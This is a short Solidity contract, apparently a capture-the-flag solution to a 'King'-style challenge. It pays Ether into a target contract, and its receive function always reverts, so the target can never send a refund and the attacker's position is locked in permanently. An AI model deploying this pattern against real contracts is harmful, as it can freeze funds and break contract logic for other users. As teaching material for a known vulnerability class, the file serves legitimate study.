pragma solidity ^0.8.4;


contract KingProxy {
    address payable targetAddr;

    constructor(address payable _targetAddr) {
        targetAddr = _targetAddr;
    }

    function attack() public payable {
        require(msg.value > 0, "msg.value expected");
        (bool retval, ) = targetAddr.call{value: msg.value}("");

        require(retval, "call to target failed");
    }

    receive() external payable {
        require(false);
    }
}